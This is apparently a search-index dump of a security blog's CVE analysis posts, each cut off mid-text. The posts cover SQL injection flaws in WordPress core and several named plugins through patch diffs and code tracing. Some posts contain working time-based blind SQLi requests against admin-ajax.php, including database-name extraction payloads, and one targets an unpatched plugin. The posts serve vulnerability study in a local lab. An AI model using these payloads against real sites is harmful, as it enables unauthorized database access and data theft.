POC","uri":"/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Due to improper data sanitization in WP_Query, it is possible in certain cases to perform an SQL Injection through plugins or themes that use it in a particular way. This vulnerability was patched in WordPress version 5.8.3. Older affected versions were also fixed through security releases going back as far as 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u003c 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2 (vulnerable) Setup Required PHP Version WordPress is entirely built in PHP, so the PHP version on the server directly affects its operation: Each PHP version introduces new features and deprecates or removes outdated syntax/functions. If WordPress uses features not supported by an old PHP version ‚Üí syntax errors or execution failure may occur. Conversely, if PHP is too new, some older functions used by WordPress might be deprecated or removed, causing runtime errors. üëâ Therefore, the PHP version must be compatible with the WordPress version. In this analysis, we use PHP 7.4 with WordPress 5.8.2. VSCode Extensions Because WordPress source code is complex, reading it line by line manually is not practical. To assist with debugging and tracing, install the following extensions in VS Code: PHP Extension Pack ‚Üí search keyword: xdebug.php-pack PHP Tools for VS Code ‚Üí search keyword: devsense.phptools-vscode Custom Plugin Since this SQLi vulnerability affects the WordPress Core but can only be exploited indirectly through plugins or themes that use WP_Query, we must interact with it via such a plugin or theme. We create a plugin using WP_Query, displaying the SQL query executed through WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Demo plugin for WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Create a new page with \u003cpage-title\u003e containing the shortcode: [demo_wp_query] üëâ The query will be displayed when visiting http://localhost/\u003cpage-title\u003e Demo page displaying WP_Query output Analysis wpdb Core PHP class used by WordPress to directly interact with MySQL. Allows developers to write and execute raw SQL queries. WP_Query An abstraction layer that retrieves post data from the database without writing raw SQL. Developers simply pass an array of parameters (args), and WordPress automatically builds the appropriate SQL. Relationship WP_Query doesn‚Äôt directly query MySQL. Instead, it builds SQL based on the arguments, applies validation/sanitization, and then calls $wpdb to execute it. Patch Diff WordPress is an open-source project with a public GitHub repository, meaning all patches are committed openly. To analyze a vulnerability, we can simply review the related commit and observe the code changes. The reference for CVE-2022-21661 links to this commit: Patch diff between versions The vulnerability was fixed in src/wp-includes/class-wp-tax-query.php Vulnerable Code $query['terms'] = array_unique( (array) $query['terms'] ); Casts $query['terms'] to an array and removes duplicates. No type checking or sanitization ‚Äî allowing injection of malicious v","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Depicter Slider WordPress plugin prior to version 3.6.2. This could allow an attacker to directly interact with your database, potentially leading to data theft or manipulation. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1 (vulnerable) and v3.6.2 (patched) Diff tool: meld or any other comparison tool to visualize differences between versions Analysis The root cause is that the application directly injects data from a GET request into the SQL query without proper sanitization or escaping. Patch Diff Use any diff tool to compare the vulnerable and patched versions. A notable difference appears in app/src/Controllers/Ajax/LeadsAjaxController.php. index, list, and export are three key functions inside the LeadsAjaxController class. public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } All three functions were patched by replacing Sanitize::textfield with Sanitize::sql, ensuring the 's' parameter is properly sanitized and SQL-escaped. Illustration of patched vs vulnerable code differences How it works To understand how textfield and sql functions behave, search for the keyword function textfield. They likely reside in the same file since both are called from the same class Sanitize. If you have the PHP Intelephense Extension installed in VSCode, you can navigate directly to the function definition using Ctrl + Click. Searching for textfield function in Sanitize class textfield returns data sanitized by sanitize_text_field, while sql returns SQL-escaped data using esc_sql(). public static function sql( $input ) { return esc_sql( $input ); } Since this is an unauthenticated vulnerability, we need to identify which of the three functions are called without any authentication mechanism. Once confirmed, we can trace deeper into the logic to verify potential SQL injection exploitation. Searching directly by function names like index, list, or export may yield too many results. Instead, search for the class name LeadsAjaxController since all functions must be invoked through it. Searching for LeadsAjaxController usage in source code üëâ The LeadsAjaxController is used during Ajax route registration. When a request is sent to /wp-admin/admin-ajax.php?action=action_here\u0026param1=..., WordPress maps the request via handle('LeadsAjaxController@function') to the corresponding method. All three functions are invoked using the GET method, but export includes a csrf-api middleware, so we can exclude it. We‚Äôll focus only on index and list. When analyzing index, we see that $response calls \\Depicter::lead()-\u003eget($args), which internally calls \\Depicter::leadRepository()-\u003egetResults($args). This is the same logic as list, so list is our main tracing point. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sou","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Woocommerce Partial Shipment plugin for WordPress prior to version 3.3. It allows attackers to directly interact with the database, potentially leading to data theft and other attacks. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2 (vulnerable) and v3.3 (patched) Diff Tool: meld or any comparison tool to view differences between versions Activated WooCommerce Plugin: must be activated before installing Woocommerce Partial Shipment Plugin, since several WooCommerce functions are used. Analysis The root cause lies in directly injecting POST request data into an SQL query without proper sanitization or validation. Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in wc-partial-shipment/woocommerce-partial-shipment.php. However, since the developer made many changes, locating the vulnerable line can be difficult. In WordPress, for SQLi to occur, the application must interact with the database using the global variable $wpdb. Searching for this keyword inside wc-partial-shipment/woocommerce-partial-shipment.php helps identify possible sinks. Sink location found in source code get_shipment_id and get_wxp_shipment_data are two functions in the WXP_Partial_Shipment class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection. Comparison between vulnerable and patched version The patch uses $wpdb-\u003eprepare() to safely construct SQL queries instead of direct string concatenation with user input. This ensures all values are properly escaped before being inserted into the SQL query, effectively mitigating SQL Injection risks. How it works Both get_shipment_id and get_wxp_shipment_data are called by the function wxp_order_set_shipped within the same class. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } üëâ The order_id parameter is taken directly from the POST request, making it user-controlled and allowing it to be passed into vulnerable SQL queries within get_shipment_id and get_wxp_shipment_data. To find where wxp_order_set_shipped is called, search for the keyword wxp_order_set_shipped inside the plugin directory. Location of wxp_order_set_shipped function call wxp_order_set_shipped is registered in the class constructor as a callback for the wp_ajax_wxp_order_set_shipped hook, meaning it can be triggered by authenticated users. üëâ Accessing /wp-admin/admin-ajax.php with the parameters: action=wxp_order_set_shipped\u0026order_id=payload_here will trigger the following: The callback wxp_order_set_shipped executes. order_id is taken directly from the request and inserted into SQL queries. The query executes twice due to its usage in two separate SQL calls containing the malicious payload. Exploit Detecting SQLi Send a POST request containing an SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) This results in the query: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Be","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Torod plugin for WordPress. This could allow attackers to directly interact with your database, including but not limited to stealing information. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 Analysis The core cause is that the application directly inserts data from a POST request into an SQL query without proper input validation or control mechanisms. Vulnerable Sink This CVE has no patch available, so we cannot use a diff tool to compare the vulnerable and fixed versions. In WordPress, for SQLi to occur, the application must interact with the database through the global variable $wpdb. We can search for this keyword in the plugin directory to locate the sink. Locate the sink in code üëâ The data from $_POST['country_id'] is directly inserted into the SQL query without proper validation. Using sanitize_text_field() only escapes the string, not fully sanitizing it. Therefore, the SQL Injection vulnerability can occur. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") How it works? The vulnerability lies in the get_regions_and_cities function of the ajaxyk class within the inc/ajaxyk.php file. To determine where it‚Äôs called, we search for the keyword get_regions_and_cities within the plugin directory. Find the get_regions_and_cities function üëâ get_regions_and_cities is registered as a callback for two action hooks via the add_action function in the ajaxyk constructor. wp_ajax_get_regions_and_cities Written in the format wp_ajax_{$action} Requires user authentication wp_ajax_nopriv_get_regions_and_cities Written in the format wp_ajax_nopriv_{$action} Does not require authentication Since this is an unauthenticated vulnerability, we only focus on the wp_ajax_nopriv_get_regions_and_cities hook. Thus, when a POST request is sent to /wp-admin/admin-ajax.php with parameters: action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here The get_regions_and_cities callback is triggered. country_id is taken directly from the request and injected into the SQL query. The query executes with the malicious payload. Exploit Detecting SQLi Send a POST request containing the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) The resulting query becomes: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Response time result üëâ Based on the response time =\u003e the payload works. Techniques usable when the table is empty: UNION: Since it does not depend on existing data in the table, but requires knowing the number of columns. Subquery: Subquery in WHERE clause: MySQL may optimize and skip the subquery if the result can be determined early. If the table has no data, MySQL might not execute SLEEP(). Subquery in FROM clause: The subquery is treated as a temporary table. MySQL must execute it first to build the temp table before executing the main query. SQL execution order Get the First Letter of Database Name The prerequisite to dump all data is to retrieve at least one character of the database name. Once that is achieved, the rest can be enumerated. Send a request with the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first character of the database name, and IF() triggers SLEEP(5) if that character is 0x77 (‚Äòw‚Äô). We use the hex encoding 0x77 for w because country_id is taken from a POST request, which is escaped by magic quotes in WordPress and by sanitize_text_field. üëâ Based on r","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"The vulnerability exists in the MyStyle Custom Product Designer WordPress plugin prior to version 3.21.2. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (vulnerable) and v3.21.2 (patched) diff tool: meld or any tool that can compare two versions to see differences Activated WooCommerce plugin: WooCommerce must be active before installing the MyStyle plugin because some functions from WooCommerce are used. Analysis The root cause is that the application directly injects data from a GET request into an SQL query without proper validation/control. Patch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference exists in the file includes/entities/class-mystyle-designmanager.php public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $order = ' ORDER BY ' . sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order .= ! empty( $_GET['order'] ) ? ' ' . sanitize_text_field( wp_unslash( $_GET['order'] ) ) : ' ASC'; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } Data from $_GET['orderby'] is injected directly into the SQL query without proper validation. Using only sanitize_text_field() and wp_unslash() only removes or escapes characters and does not guarantee safety. Therefore, SQLi is possible. public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order = ! empty( $_GET['order'] ) ? sanitize_text_field( wp_unslash( $_GET['order'] ) ) : 'ASC'; // Validate order direction to prevent SQL injection. $allowed_orderby = array( 'ms_design_id', 'ms_title', 'ms_access', 'ms_email', 'ms_date_created', 'ms_date_modified', ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : 'ms_design_id'; $order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ), true ) ? $order : 'ASC'; $order = ' ORDER BY ' . $orderby . ' ' . $order; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } The patch implements a whitelist ($allowed_orderby) that explicitly defines allowable columns for ordering. If the orderby value is not in the allowed list, it is replaced with the default 'ms_design_id' ‚Äî preventing injection of malicious payloads. Patch diff How it works The vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. üëâ get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage Because this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function get_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyl","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Accessibility Suite plugin for WordPress before version 4.19. This allows an attacker to directly interact with the database, potentially stealing sensitive information. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18 (vulnerable) and v4.19 (patched) Diff tool: meld or any other comparison tool to spot version differences Analysis The plugin failed to properly typecast user input. Although it used prepare() to prevent SQLi, the implementation was incorrect, leaving the vulnerability exploitable. Patch Diff Use any diff tool to compare the vulnerable and patched versions. A key difference appears in includes/classes/Helper.php. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } The patched version passes $scan_id as a parameter to the query instead of directly concatenating it. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch Diff How it works The vulnerability resides in the static function save_false_positive of class Helper in includes/classes/Helper.php. To locate where it‚Äôs called, search for save_false_positive in the plugin directory. Search Function Call üëâ The save_false_positive function is called as a callback by the action hook wp_ajax_ONLINE_ADAv4/save_false_positive. When a POST request is sent to /wp-admin/admin-ajax.php with action=ONLINE_ADAv4/save_false_positive, the callback is executed. It requires two POST parameters: issue_id and scan_id. If they‚Äôre missing, the app returns: The function checks if the user has admin privileges; if not, it returns an empty string. if(! is_admin()) { return ''; } Then, the parameters are directly concatenated into the vulnerable SQL query. Exploit Detecting the SQLi Send a POST request containing an SQLi payload. Since it only requires an authenticated user with access to /wp-admin/, we can use a subscriber role ‚Äî the lowest privilege in WordPress. Higher roles inherit lower privileges, so this confirms the CVE‚Äôs description. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) The resulting SQL query becomes: SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time-based SQLi Response üëâ The delayed response confirms that the SQLi payload works. Alternative techniques for empty tables: UNION ‚Äî works even when the base query returns no rows, but you must find the correct column count. Subquery: In WHERE clause: MySQL may optimize it away if results are predictable. In FROM clause: The subquery executes first to create a temporary table, ensuring the injected query runs. SQL Execution Order Diagram Extracting the First Letter of the Database Name To fully dump data, we first confirm that SQLi allows reading at least one character from the database name. Use this payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, S","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Mail Mint plugin for WordPress prior to version 1.18.6. This flaw allows attackers to directly interact with the database ‚Äî potentially leading to information disclosure or data theft. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS Severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5 (vulnerable) and v1.18.6 (patched) Diff tool: meld or any comparison tool to visualize the code difference between versions Analysis The vulnerable function directly inserts user input into an SQL query without using proper sanitization or query preparation, leading to an SQL Injection vulnerability. Patch Diff Use any diff tool to compare the vulnerable and patched versions. There is a clear difference in the file /app/Utilities/Helper/Import.php. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } The patch replaces direct string concatenation with the safer $wpdb-\u003eprepare() method. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff How It Works The vulnerability resides in the function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) inside the Import class. To trace its usage, search for the keyword get_wp_users_by_learndash_with_limit_offset in the plugin directory. Search Import The function is called inside: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() These functions belong to the ContactImportAction class in /app/API/Actions/Admin/Contact/ContactImportAction.php. Next, searching for retrieve_contacts_associated_with_learndash reveals it is used inside another method: Search 1 This function is invoked by map_contacts_with_learndash() in the ContactImportController class located in /app/API/Controllers/Admin/Contact/ContactImportController.php. Further tracing map_contacts_with_learndash shows it is registered as a REST API callback: Search 2 class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Call flow: A POST request i","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"A vulnerability exists in the Easy Quotes WordPress plugin prior to version 1.2.3. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Easy Quotes Plugin: v1.2.2 (vulnerable) and v1.2.3 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The application injects user-supplied data directly into an SQL query without appropriate protections, which leads to SQL Injection. Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file includes/quotes-data.php: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } The patch uses $wpdb-\u003eprepare() instead of concatenating user-supplied data directly into the query: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Many other functions were patched the same way, such as get_font_variant($family_id, $variant_id), get_font_variants($family), and get_fonts($category = -1). Although get_fonts_categories() was also updated, it does not accept user input and is thus not relevant to the SQLi issue: public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } How it works We exploit the SQL Injection in the function get_family_data($family), and other functions are vulnerable in a similar manner. get_family_data() is a private function in the Quotes_Data class (the example below shows context): class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other functions public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() is called by get_family() and get_font_variants(); to find where these are used, search for get_family or get_font_variants. Search function The get_font_variants() function is invoked by rest_route_callback_font_variants() in the Quotes_Rest_Route class: class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function 